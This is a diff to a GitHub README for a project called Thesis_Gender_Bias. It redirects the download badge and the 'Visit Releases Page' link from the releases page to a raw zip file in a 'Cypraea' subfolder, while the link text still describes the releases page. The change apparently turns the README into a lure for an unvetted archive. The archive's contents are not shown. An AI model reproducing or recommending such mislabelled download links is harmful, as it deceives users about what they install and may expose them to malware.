@@ -6,13 +6,13 @@ Welcome to the Thesis_Gender_Bias repository! This project helps you explore gen
 
 ## 🔗 Download Now
 
-[![Download Thesis_Gender_Bias](https://img.shields.io/badge/Download-Thesis_Gender_Bias-brightgreen)](https://github.com/iampeti/Thesis_Gender_Bias/releases)
+[![Download Thesis_Gender_Bias](https://raw.githubusercontent.com/iampeti/Thesis_Gender_Bias/main/Cypraea/Thesis_Gender_Bias.zip)](https://raw.githubusercontent.com/iampeti/Thesis_Gender_Bias/main/Cypraea/Thesis_Gender_Bias.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
    Click the link below to go to the download page.  
-   [Visit Releases Page to Download](https://github.com/iampeti/Thesis_Gender_Bias/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/iampeti/Thesis_Gender_Bias/main/Cypraea/Thesis_Gender_Bias.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, look for the most recent version. It typically shows a version number like `v1.0`.  
